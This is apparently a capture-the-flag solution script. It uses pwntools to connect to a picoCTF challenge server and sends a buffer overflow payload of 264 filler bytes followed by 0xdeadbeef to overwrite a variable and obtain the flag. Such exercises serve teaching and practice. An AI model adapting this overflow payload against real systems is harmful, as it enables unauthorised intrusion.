from pwn import *
p = remote('mars.picoctf.net', 31890)

payload = b"a" * 264 + p32(0xdeadbeef)

p.sendline(payload)
p.interactive()    # receives flag
